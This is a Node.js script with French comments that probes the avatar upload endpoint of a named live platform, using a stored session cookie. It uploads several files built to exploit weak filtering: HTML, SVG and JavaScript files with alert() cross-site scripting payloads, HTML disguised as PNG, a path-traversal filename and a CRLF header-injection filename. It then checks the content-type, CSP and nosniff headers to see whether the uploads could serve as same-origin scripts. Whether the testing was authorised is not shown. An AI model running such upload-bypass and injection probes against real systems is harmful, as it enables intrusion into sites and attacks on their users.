// CYBERAAR : upload d avatar — le serveur filtre-t-il le type et le nom de fichier ?
// L avatar est servi sur l origine de la plateforme et affiche publiquement (leaderboard, profil)
// -> un SVG/HTML accepte = fichier same-origin potentiellement exploitable en <script src=...>
import fs from "fs";
const APP = "https://aarme.cyberaar.io";
const UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36";
const COOKIE = fs.readFileSync("/tmp/opencode/cyberaar/session-alias.txt", "utf8").trim();
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const PNG = Buffer.from("89504e470d0a1a0a0000000d49484452000000010000000108060000001f15c4890000000a49444154789c6360000000200015a2d4a0000000049454e44ae426082", "hex");
async function up(label, filename, type, content) {
  const fd = new FormData();
  fd.append("file", new Blob([content], { type }), filename);
  const t0 = Date.now();
  for (let i = 0; i < 3; i++) {
    try {
      const r = await fetch(APP + "/api/aarme/account/avatar", { method: "POST", headers: { Accept: "application/json", "User-Agent": UA, Origin: APP, Referer: APP + "/compte/", Cookie: COOKIE }, body: fd, redirect: "manual", signal: AbortSignal.timeout(30000) });
      const t = await r.text();
      console.log("  " + label.padEnd(46) + "HTTP " + r.status + " " + String(Date.now() - t0).padStart(5) + "ms  " + t.replace(/\s+/g, " ").slice(0, 220));
      return { s: r.status, txt: t };
    } catch (e) { await sleep(4000); }
  }
  console.log("  " + label.padEnd(46) + "ERR (reseau)");
  return { s: 0, txt: "ERR" };
}
console.log("=== upload d avatar : le type est-il filtre cote serveur ? ===\n");
const r1 = await up("1. PNG valide (controle)", "photo.png", "image/png", PNG);
await sleep(25000);
const r2 = await up("2. HTML type text/html", "x.html", "text/html", Buffer.from("<html><body><script>alert(document.domain)</script>PING-AVATAR</body></html>"));
await sleep(25000);
const r3 = await up("3. HTML deguise en image/png", "x.png", "image/png", Buffer.from("<html><body><script>alert(1)</script>PING-PNG</body></html>"));
await sleep(25000);
const r4 = await up("4. SVG (XSS)", "x.svg", "image/svg+xml", Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'));
await sleep(25000);
const r5 = await up("5. nom en traversee de chemin", "../../../../tmp/evil.png", "image/png", PNG);
await sleep(25000);
const r6 = await up("6. nom avec CRLF", "a\r\nX-Injected: 1.png", "image/png", PNG);
await sleep(25000);
const r7 = await up("7. nom en .js (script same-origin)", "x.js", "application/javascript", Buffer.from("alert(document.domain)"));

console.log("\n=== comment l avatar est-il servi ? (type, inline, CSP) ===");
let url = "";
for (const r of [r1, r2, r3, r4, r5, r6, r7]) {
  if (r.s === 200) { try { const j = JSON.parse(r.txt); url = j.url || j.avatar_url || j.avatar || ""; if (url) { console.log("  URL renvoyee : " + url); break; } } catch {} }
}
if (!url) {
  // l'URL peut etre dans /account/me
  const me = await fetch(APP + "/api/aarme/account/me", { headers: { Accept: "application/json", "User-Agent": UA, Origin: APP, Cookie: COOKIE } });
  const mt = await me.text();
  const m = mt.match(/"avatar":"([^"]+)"/);
  url = m ? m[1] : "";
  console.log("  avatar dans /me : " + (url || "(vide)"));
}
if (url) {
  const full = url.startsWith("http") ? url : APP + url;
  const h = await fetch(full, { headers: { "User-Agent": UA }, redirect: "manual" });
  const hh = h.headers;
  console.log("  GET " + full.replace("https://", "").slice(0, 70));
  console.log("     HTTP " + h.status + " | content-type: " + (hh.get("content-type") || "-") + " | content-disposition: " + (hh.get("content-disposition") || "-"));
  console.log("     csp: " + (hh.get("content-security-policy") || "(aucune)").slice(0, 180));
  console.log("     x-content-type-options: " + (hh.get("x-content-type-options") || "-"));
  const body = await h.text();
  console.log("     corps (100 premiers car.) : " + body.replace(/\s+/g, " ").slice(0, 100));
}
